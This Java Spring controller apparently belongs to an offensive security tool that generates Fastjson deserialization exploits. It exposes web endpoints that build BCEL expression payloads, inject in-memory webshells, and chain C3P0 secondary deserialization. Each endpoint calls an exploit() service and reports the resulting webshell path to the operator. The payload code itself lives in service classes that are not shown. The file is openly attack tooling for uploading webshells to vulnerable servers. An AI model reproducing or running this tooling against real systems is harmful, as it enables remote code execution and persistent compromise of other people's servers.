package com.droplab.Controller.FastJson;

import com.droplab.Controller.FastJson.Service.FastJsonBCEL;
import com.droplab.Controller.FastJson.Service.FastJsonC3P0Other;
import com.droplab.Controller.FastJson.Service.FastJsonC3P0SELF;
import com.droplab.Controller.elShell.Service.elShellUploadShell;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 用于生成一些fastjson的利用文件。
 */
@Controller
@RequestMapping("/fastjson")
public class FastjsonController {
    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "Fastjson/index.html";
    }

    /**
     * BCEL表达式payload
     */
    @RequestMapping(value = "/bcel", method = RequestMethod.POST)
    public String C3P0BCEL(Model model,
                           @RequestParam(value = "files", required = false) List<MultipartFile> files,
                           @RequestParam(value = "mType", required = true) String mType,
                           @RequestParam(value = "mOption", required = true) String mOption) {
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("mOption", mOption);
            String filename = CommonUtils.RandomStr(8);
            hashMap.put("filename", filename);
            hashMap.put("mType", mType);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            FastJsonBCEL fastJsonBCEL = (FastJsonBCEL) Class.forName(getMap().get("bcel")).newInstance();
            fastJsonBCEL.setParams(hashMap);
            Connection.Response response = fastJsonBCEL.exploit();
            if (response != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(response.bodyAsBytes());
                String[] split = s.split("\\|\\|");
                modelMap.put("bcel",split[0]);
                modelMap.put("bceltips", String.format("如果写入成功，webshell路径：/%s.jsp", filename));
                CommonUtils.modelSet(modelMap, model);
                return "Fastjson/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("bcel", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Fastjson/index.html";

    }

    /**
     * BCEL表达式注入内存马
     */
    @RequestMapping(value = "/bcelMemory", method = RequestMethod.POST)
    public String C3P0BCELMemory(Model model,
                           @RequestParam(value = "mOption", required = true) String mOption,
                           @RequestParam(value = "mType", required = true) String mType,
                           @RequestParam(value = "mMiddle", required = true) String mMiddle,
                           @RequestParam(value = "path", required = false,defaultValue = "") String path,
                           @RequestParam(value = "mshellType", required = true) String mshellType,
                           @RequestParam(value = "password", required = false,defaultValue = "") String password) {
        try {
            HashMap hashMap = new HashMap();
            hashMap.put("mOption", mOption);
            hashMap.put("mType",mType);
            hashMap.put("mMiddle",mMiddle);
            hashMap.put("path",path);
            hashMap.put("mshellType",mshellType);
            hashMap.put("password",password);
            FastJsonBCEL fastJsonBCEL = (FastJsonBCEL) Class.forName(getMap().get("bcel")).newInstance();
            fastJsonBCEL.setParams(hashMap);
            Connection.Response response = fastJsonBCEL.exploit();
            if (response != null) {
                HashMap<String, String> modelMap = new HashMap<>();
                String s = new String(response.bodyAsBytes());
                String[] split = s.split("\\|\\|");
                modelMap.put("bcelMemory", split[0]);
                modelMap.put("bcelMemoryCode", split[1]);
                modelMap.put("bcelMemorytips", "通过POST dy参数传递内存马注入代码");
                CommonUtils.modelSet(modelMap, model);
                return "Fastjson/index.html";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("bcelMemory", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Fastjson/index.html";
        //com.mchange.v2.naming.ReferenceIndirector
    }


    /**
     * fastjson加C3P0二次反序列化调用C3P0本身，避免其他依赖环境
     */
    @RequestMapping(value = "/c3p0self", method = RequestMethod.POST)
    public String C3P0Self(Model model,
                           @RequestParam(value = "files", required = true) List<MultipartFile> files) {
        try {
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.Random();
            hashMap.put("filename", filename);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                FastJsonC3P0SELF fastJsonC3P0SELF = (FastJsonC3P0SELF) Class.forName(getMap().get("c3p0self")).newInstance();
                fastJsonC3P0SELF.setParams(hashMap);
                Connection.Response response = fastJsonC3P0SELF.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("c3p0self", new String(response.bodyAsBytes()));
                    modelMap.put("c3p0selftips", String.format("如果写入成功，webshell路径：/%s.jsp", filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "Fastjson/index.html";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("c3p0self", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Fastjson/index.html";

    }


    /**
     * fastjson加C3P0二次反序列化调用其他组件反序列化
     */
    @RequestMapping(value = "/c3p0other", method = RequestMethod.POST)
    public String C3P0Other(Model model,
                            @RequestParam(value = "files", required = true) List<MultipartFile> files) {
        try {
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.Random();
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + filename + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                FastJsonC3P0Other fastJsonC3P0Other = (FastJsonC3P0Other) Class.forName(getMap().get("c3p0other")).newInstance();
                fastJsonC3P0Other.setParams(hashMap);
                Connection.Response response = fastJsonC3P0Other.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("c3p0other", new String(response.bodyAsBytes()));
                    CommonUtils.modelSet(modelMap, model);
                    return "Fastjson/index.html";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("c3p0self", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "Fastjson/index.html";

    }


    private Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("c3p0self", "com.droplab.Controller.FastJson.Service.FastJsonC3P0SELF");
        hashMap.put("c3p0other", "com.droplab.Controller.FastJson.Service.FastJsonC3P0Other");
        hashMap.put("bcel", "com.droplab.Controller.FastJson.Service.FastJsonBCEL");
        return hashMap;
    }
}
